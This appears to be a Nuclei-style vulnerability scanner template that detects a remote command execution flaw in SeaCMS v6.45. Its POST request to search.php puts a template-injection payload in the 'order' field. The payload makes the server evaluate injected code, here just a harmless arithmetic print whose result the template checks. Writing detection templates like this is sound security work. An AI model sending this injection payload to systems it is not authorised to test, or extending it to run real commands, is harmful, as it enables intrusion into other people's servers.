id: seacmsv645-command-exec
info:
  name: Seacmsv645 Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    Seacmsv645 Remote Command Execution vulnerability allowing arbitrary command execution.
variables:
  rand1: "{{rand_int(10000000, 80000000)}}"
  rand2: "{{rand_int(10000, 21000)}}"
http:
  - method: POST
    path:
      - "{{BaseURL}}/search.php?searchtype=5"
    body: "searchtype=5&order=}{end if} {if:1)print({{rand1}}%2b{{rand2}});if(1}{end if}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{to_number(rand1) + to_number(rand2)}}"
        part: body
      - type: status
        status:
          - 200
